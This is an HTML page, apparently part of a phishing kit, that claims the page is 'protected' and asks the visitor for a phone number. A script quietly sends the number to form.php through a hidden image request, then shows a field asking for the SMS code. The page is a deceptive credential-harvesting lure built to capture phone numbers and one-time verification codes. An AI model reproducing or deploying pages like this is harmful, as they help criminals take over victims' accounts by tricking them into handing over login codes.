<html>
  <head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
      #block{
        margin-top: 15%;
      }h5{color:red;}
      #code{
        display:none;
        margin-top: 15%;
      }
    </style>
  </head>
  <body>
    <center>
      <h1>Страница защищена.</h1>
      <h5>Введите номер телефона, чтобы продолжить!</h5>
      <hr>
    <div id="block" >
      <h3>Your number phone:</h3>
      <input type=phone id=numb>
      <input type="submit" value="Далее" id="phone" placeholder="Phone number">
    </div>
    <div id=code>
      <input type="number" name="" placeholder="SMS Code">
      <input type="submit" value="Send">
    </div>
  </center>
  <img scr="" style="display:none;" id=sender>
  </body>
  <script>
  var code = document.getElementById('code')
  var block = document.getElementById('block')
  var numb = document.getElementById('numb')
  var sender = document.getElementById('sender')
  document.getElementById('phone').onclick = function(){
    if(numb.value===""){alert("Error. Укажите ваш номер телефона!")}else{
    sender.src="form.php?phone="+numb.value;
    code.style.display="block";
    block.style.display="none";
    }
  };
  </script>
</html>
